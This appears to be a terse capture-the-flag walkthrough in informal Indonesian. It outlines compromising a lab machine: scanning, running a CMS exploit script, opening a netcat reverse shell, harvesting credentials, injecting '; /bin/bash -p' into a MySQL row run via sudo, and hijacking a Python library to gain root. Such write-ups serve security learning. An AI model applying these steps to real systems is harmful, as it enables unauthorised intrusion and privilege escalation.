1. scan nmap 80 22 kebuka -> fuzz /app kebuka -> cari exploit cms ama versinya
2. klaik admin itu buat masukin password -> dan passwordnya password
3. cara pake -> python3 exp.py ip port password /app/gatauk
4. masuk shell di phar noh copas aja -> revshell aja pake nc mkfifo
5. ke /opt ada file jir ada creds nya juga di cat -> gatau di linpeash ketauan apa ga
6. ssh aja kesitu -> ls -la ada history cat aja -> ada creds mysql -> bisa tuh cek di mysql di table library
7. coba command ini -> UPDATE dreams SET dream = '; /bin/bash -p' WHERE dreamer = 'Alice'; -> run pake yg di sudo -l itu 
8. sudo -u death /usr/bin/python3 /home/death/getDreams.py -> shell rusak -> chmod 777 /home/death/getDreams.py -> exit
9. cat script nya -> su -> klaim flag   
10. ke morpeus -> ls -la -> rid aja script nya -> find / -name "shutil*" 2>/dev/null
11. cari yg .py -> replace revshell python aja terus run mungkin 
12. run aja restore.py nya di morpeus -> sudo su ->  klaim flag
